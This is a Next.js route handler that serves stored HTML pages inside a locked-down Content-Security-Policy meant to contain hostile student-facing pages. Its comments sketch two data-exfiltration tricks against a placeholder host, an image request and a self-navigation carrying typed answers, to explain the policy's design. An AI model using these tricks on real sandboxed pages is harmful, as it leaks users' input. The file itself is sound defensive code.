import { NextResponse } from "next/server";
import { getPageBySlug } from "@/lib/pages";

// The iframe sandbox is the primary control; this is the second layer. Every
// directive here is deliberately restricted to what the document carries
// inside itself — no https: anywhere — because a subresource load is a real
// network request and `img-src https:` alone would let a hostile page
// exfiltrate whatever a student typed via `<img src="https://…?d=answer">`.
// `connect-src 'none'` closes fetch/XHR/beacon but NOT subresource loads,
// which is why the passive directives have to be closed too.
//
// Residual, accepted and unclosable: a sandboxed frame may navigate itself,
// so `location.href = "https://…?d=…"` still leaks. No CSP directive
// prevents it (`navigate-to` was never shipped). The sandbox does block
// navigating the TOP window and opening popups.
//
// Consequence: a page that pulls a font, image, stylesheet or script from a
// CDN will not load it. Self-contained files are the only supported kind.
const CONTENT_SECURITY_POLICY = [
  "default-src 'none'",
  "script-src 'unsafe-inline' 'unsafe-eval' blob:",
  "style-src 'unsafe-inline'",
  "img-src data: blob:",
  "font-src data:",
  "media-src data: blob:",
  "connect-src 'none'",
  "frame-ancestors 'self'",
  "form-action 'none'",
  "base-uri 'none'",
].join("; ");

export async function GET(
  _request: Request,
  { params }: { params: Promise<{ slug: string }> },
) {
  const { slug } = await params;
  const page = await getPageBySlug(slug);
  if (!page) return new NextResponse("Not found", { status: 404 });

  return new NextResponse(page.html, {
    headers: {
      "Content-Type": "text/html; charset=utf-8",
      "Content-Security-Policy": CONTENT_SECURITY_POLICY,
      "X-Content-Type-Options": "nosniff",
      "Cache-Control": "no-store",
    },
  });
}
